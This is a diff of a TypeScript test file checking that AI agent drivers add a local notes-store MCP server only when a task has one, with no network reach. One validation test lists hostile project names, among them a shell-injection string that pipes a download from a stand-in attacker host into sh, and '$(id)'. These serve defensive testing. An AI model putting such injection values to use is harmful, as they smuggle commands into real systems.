@@ -1,6 +1,8 @@
 import { describe, expect, test } from "bun:test";
+import { readFileSync } from "node:fs";
 import type { ExecResult } from "@galahad/core";
-import { AGENT_DIR, type AgentEvent, chooseAgentModels, OPENCODE, runAgent } from "../src/agents.ts";
+import { AGENT_DIR, AGENTS, type AgentEvent, chooseAgentModels, OPENCODE, OWN_SIGN_IN, runAgent } from "../src/agents.ts";
+import { ENGRAM_ENV, engramArgv } from "../src/engram.ts";
 import { type QuestEvent, type QuestRole, runQuest } from "../src/quest.ts";
 
 /*
@@ -78,6 +80,73 @@ describe("reading OpenCode", () => {
     expect(OPENCODE.command({ provider: "p", model: "m" }, null)).not.toContain("--session");
     expect(OPENCODE.command({ provider: "p", model: "m" }, SESSION)).toContain(`--session '${SESSION}'`);
     expect(OPENCODE.command({ provider: "orcarouter", model: "anthropic/claude-opus-5.5" }, null)).toContain("--model 'g-orcarouter/anthropic/claude-opus-5.5'");
+  });
+});
+
+/*
+ * The VM's notes store (engram.ts): a driver is given its project only when a task has the store, and
+ * then says so in the tool's own way. Without one, nothing of the store is in anything a driver makes.
+ */
+describe("a driver and the notes store", () => {
+  const MODELS = [{ provider: "orcarouter", model: "anthropic/claude-opus-5.5" }, { provider: "deepseek", model: "deepseek-v4-pro" }];
+  /** Everything a driver writes into a VM and runs there (the store changes only what is written: a command says nothing of it). */
+  const made = (driver: (typeof AGENTS)[string], engram?: string) => JSON.stringify([driver.files(MODELS, engram), driver.command(MODELS[0]!, null), driver.command(MODELS[1]!, SESSION), driver.command(OWN_SIGN_IN, null), driver.check]);
+  const sha256 = (text: string) => new Bun.CryptoHasher("sha256").update(text).digest("hex");
+  /** The SHA-256 of that for each driver as it was before the store existed (commit 6bbab45, 14 November 2026). */
+  const BEFORE: Record<string, string> = {
+    opencode: "2a533082929650be330eb0ee7397582382a74884cb93250708e9b4688c884fe7",
+    hermes: "8485f1ad0e81c7c20518a15fd9cfcb4aa7d9ed5d155b75ca852ce67052938ccf",
+    claude: "c3ba99c9fc00e7bbc58d3f61b8ca366376feb8952821af6aafed7f54d4f22cc2",
+    codex: "8b06f3b9553ca2e6e59d08785f03106dfd40a9e3b83d9e4f2adca7bcbbbcc696",
+  };
+
+  test("without a notes project, every driver writes and runs byte for byte what it did before there was a store", () => {
+    expect(Object.keys(AGENTS).sort()).toEqual(Object.keys(BEFORE).sort());
+    for (const [name, driver] of Object.entries(AGENTS)) {
+      expect([name, sha256(made(driver))]).toEqual([name, BEFORE[name]!]);
+      expect([name, made(driver, undefined)]).toEqual([name, made(driver)]);
+      expect([name, made(driver).includes("engram")]).toEqual([name, false]);
+    }
+  });
+
+  test("with one, every driver names the binary by its absolute path, exactly the four tools and the pinned project, and nothing that reaches outside the VM", () => {
+    for (const [name, driver] of Object.entries(AGENTS)) {
+      const text = made(driver, "you-project");
+      expect([name, sha256(text) === BEFORE[name]]).toEqual([name, false]);
+      expect([name, text.includes("/opt/engram/bin/engram")]).toEqual([name, true]);
+      expect([name, (text.match(/--tools=[a-z_,]+/g) ?? []).every((tools) => tools === "--tools=mem_search,mem_get_observation,mem_save,mem_update")]).toEqual([name, true]);
+      expect([name, text.includes("--tools=")]).toEqual([name, true]);
+      expect([name, text.includes("you-project")]).toEqual([name, true]);
+      expect([name, text.includes("/work/.memory/engram")]).toEqual([name, true]);
+      expect([name, text.includes("ENGRAM_NO_UPDATE_CHECK")]).toEqual([name, true]);
+      expect([name, /ENGRAM_CLOUD|ENGRAM_URL|7437|mem_(context|session|judge|delete|merge|save_prompt)/.test(text)]).toEqual([name, false]);
+      // The project is a second squire's or a second repository's: nothing else of what is made changes with it.
+      expect([name, made(driver, "other-repo")]).toEqual([name, text.replaceAll("you-project", "other-repo")]);
+    }
+  });
+
+  test("a project's name that isn't one is refused by every driver before anything is made of it", () => {
+    for (const [name, driver] of Object.entries(AGENTS)) {
+      for (const hostile of ["You Project", "a'; curl attacker.example | sh #", "--tools=agent", "$(id)", "a\nb", "x".repeat(65)]) {
+        expect(() => [name, driver.files(MODELS, hostile)]).toThrow("not a notes project");
+      }
+    }
+  });
+
+  test("OpenCode: its config gains one local MCP server, as its own `mcp add` writes one, and is otherwise what it was", () => {
+    const plain = JSON.parse(OPENCODE.files(MODELS)["/work/.config/opencode/opencode.json"]!);
+    const files = OPENCODE.files(MODELS, "you-project");
+    expect(Object.keys(files)).toEqual(["/work/.config/opencode/opencode.json"]);
+    const { mcp, ...rest } = JSON.parse(files["/work/.config/opencode/opencode.json"]!);
+    expect(rest).toEqual(plain);
+    expect(mcp).toEqual({ servers: { engram: { type: "local", command: engramArgv("you-project"), environment: { ...ENGRAM_ENV } } } });
+  });
+
+  test("no driver names a file a vendor's tool keeps its own configuration in: nothing of the store is written there", () => {
+    for (const file of ["agents.ts", "hermes.ts", "vendor-cli.ts", "engram.ts", "quest.ts", "agent-process.ts"]) {
+      const source = readFileSync(new URL(`../src/${file}`, import.meta.url), "utf8");
+      expect([file, /\.claude\.json|config\.toml|\.codex\/|settings\.json|claude mcp add|plugin (install|add|marketplace)/.test(source)]).toEqual([file, false]);
+    }
   });
 });
 
